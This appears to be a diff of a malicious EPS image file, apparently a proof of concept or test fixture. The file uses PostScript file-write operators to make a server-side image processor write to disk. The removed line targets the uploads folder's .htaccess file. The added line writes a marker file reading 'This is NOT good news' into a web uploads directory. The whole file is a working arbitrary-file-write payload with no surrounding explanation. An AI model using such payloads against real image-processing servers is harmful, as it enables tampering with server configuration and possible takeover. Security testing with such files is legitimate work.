@@ -1,5 +1,5 @@
 %!PS-Adobe-2.0 EPSF-1.2
-/outf (/uploads/.htaccess) (w) file def
+/outf (/var/www/html/uploads/66a0f379ef761/eww.popa) (w) file def
 outf (This is NOT good news) writestring
 outf closefile 
 showpage
